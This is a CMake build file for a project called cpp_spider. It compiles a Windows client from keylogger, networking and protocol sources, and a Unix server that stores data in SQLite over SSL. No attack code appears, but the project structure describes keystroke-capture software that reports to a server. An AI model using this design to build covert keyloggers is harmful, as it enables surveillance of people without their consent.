project(cpp_spider_client)

set(CMAKE_CXX_STANDARD 11)

set(CMAKE_CPP_FLAGS "${CMAKE_CPP_FLAGS} -W -Wall -Wextra -Werror -ggdb3")

if (WIN32)
    cmake_minimum_required(VERSION 3.9.3)
    set(SOURCE_FILES
        sources/KeyLogger/KeyboardMap.cpp
        sources/KeyLogger/WindowsKeyLogger.cpp
        sources/logger/Logger.cpp
        sources/Network/ClientNetwork.cpp
        sources/Protocol/Buffer.cpp
        sources/Protocol/Serializer.cpp
        sources/Protocol/ClientProtocol.cpp
        sources/Protocol/BufferSender.cpp
        sources/ClientCore.cpp
        sources/ClientMain.cpp
        sources/Thread/BoostThread.cpp)
    include_directories(includes)
    add_definitions(-D_WIN32_WINNT=0x0501)
    SET (Boost_FIND_REQUIRED TRUE)
    SET (Boost_FIND_QUIETLY TRUE)
    SET (Boost_DEBUG FALSE)
    set (Boost_USE_MULTITHREADED TRUE)
    set (Boost_USE_STATIC_LIBS TRUE)
    SET (Boost_ADDITIONAL_VERSIONS "1.65.1" "1.65.1")
    FIND_PACKAGE(Boost COMPONENTS  program_options )
    INCLUDE_DIRECTORIES(${Boost_INCLUDE_DIRS})
    LINK_DIRECTORIES(${Boost_LIBRARY_DIRS})
    INCLUDE_DIRECTORIES(C:/OpenSSL-Win32/include)
    find_package(OPENSSL)
    add_executable(cpp_spider_client ${SOURCE_FILES})
    target_link_libraries(cpp_spider_client ${Boost_LIBRARIES} ${OPENSSL_LIBRARIES})
else(UNIX)
    cmake_minimum_required(VERSION 3.8)
    set(SOURCE_FILES
        includes/Database/IDatabase.hpp
        includes/Database/Sqlite.hpp
        includes/logger/Logger.hpp
        includes/Network/ServerNetwork.hpp
        includes/Protocol/Buffer.hpp
        sources/Protocol/ServerBuffer.cpp
        includes/Protocol/IProtocol.hpp
        includes/Protocol/Serializer.hpp
        includes/Protocol/ServerProtocol.hpp
        includes/dataStructure.hpp
        includes/ServerCore.hpp
        includes/Thread/IThread.hpp
        includes/Thread/BoostThread.hpp
        includes/SpiderException.hpp
        sources/Database/Sqlite.cpp
        sources/Thread/BoostThread.cpp
        sources/logger/Logger.cpp
        sources/Network/ServerNetwork.cpp
        sources/Protocol/Buffer.cpp
        sources/Protocol/Serializer.cpp
        sources/Protocol/ServerProtocol.cpp
        sources/ServerCore.cpp
        sources/ServerMain.cpp
        sources/Thread/BoostThread.cpp)
    set(Boost_USE_STATIC_LIBS OFF)
    set(Boost_USE_MULTITHREADED ON)
    set(Boost_USE_STATIC_RUNTIME OFF)
    find_package(Boost 1.63.0 COMPONENTS system thread REQUIRED)

    add_executable(cpp_spider_server ${SOURCE_FILES})
    target_link_libraries(cpp_spider_server boost_system boost_thread sqlite3 ssl crypto)
    include_directories(includes)
endif()